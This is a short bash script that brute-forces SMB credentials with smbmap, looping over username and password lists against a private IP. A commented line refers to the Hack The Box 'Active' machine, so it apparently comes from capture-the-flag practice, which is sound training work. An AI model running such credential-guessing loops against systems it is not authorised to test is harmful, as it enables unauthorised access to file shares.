#!/bin/bash
for user in $(cat usernames)
do

	for pass in $(cat passwords)
	do
		echo "Testing $user:$pass"
		#smbmap -d active.htb -u svc_tgs -p thepassword -H 10.10.10.100
		smbmap -u $user -p $pass -H 192.168.130.134 | grep -i "READ"
	done

done